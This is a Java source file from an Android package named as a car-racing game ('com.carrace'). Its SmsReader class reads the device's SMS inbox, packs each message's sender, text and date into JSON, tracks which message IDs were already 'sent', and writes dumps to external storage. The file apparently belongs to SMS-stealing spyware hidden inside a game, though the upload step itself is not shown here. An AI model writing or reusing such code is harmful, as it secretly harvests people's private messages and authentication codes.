package com.carrace;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Set;

public final class SmsReader {

    private static final String TAG = "SmsReader";
    public static final Uri URI = Uri.parse("content://sms/inbox");

    private SmsReader() { }

    public static JSONArray readNewSms(Context ctx, Set<String> sentIds) {
        JSONArray arr = new JSONArray();
        Cursor c = null;
        try {
            c = ctx.getContentResolver().query(
                    URI,
                    new String[]{"_id", "address", "body", "date"},
                    null, null, "date ASC");
            if (c == null) return arr;
            while (c.moveToNext()) {
                String id = c.getString(0);
                if (id == null || sentIds.contains(id)) continue;
                sentIds.add(id);
                JSONObject o = new JSONObject();
                o.put("id", id);
                o.put("from", safe(c.getString(1)));
                o.put("body", safe(c.getString(2)));
                o.put("date", c.getLong(3));
                arr.put(o);
            }
        } catch (Exception e) {
            Log.w(TAG, "baca sms gagal", e);
        } finally {
            if (c != null) c.close();
        }
        return arr;
    }

    public static void writeJsonToDisk(Context ctx, String json) {
        try {
            File dir = ctx.getExternalFilesDir(null);
            if (dir == null) dir = new File(Environment.getExternalStorageDirectory(), "ApkReactCh");
            if (!dir.exists()) dir.mkdirs();
            String name = "sms_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
                    .format(new Date()) + ".json";
            File out = new File(dir, name);
            try (FileOutputStream fos = new FileOutputStream(out, true)) {
                fos.write(json.getBytes(StandardCharsets.UTF_8));
            }
            Log.i(TAG, "tulis json: " + out.getAbsolutePath());
        } catch (Exception e) {
            Log.w(TAG, "tulis json gagal", e);
        }
    }

    private static String safe(String s) { return s == null ? "" : s; }
}
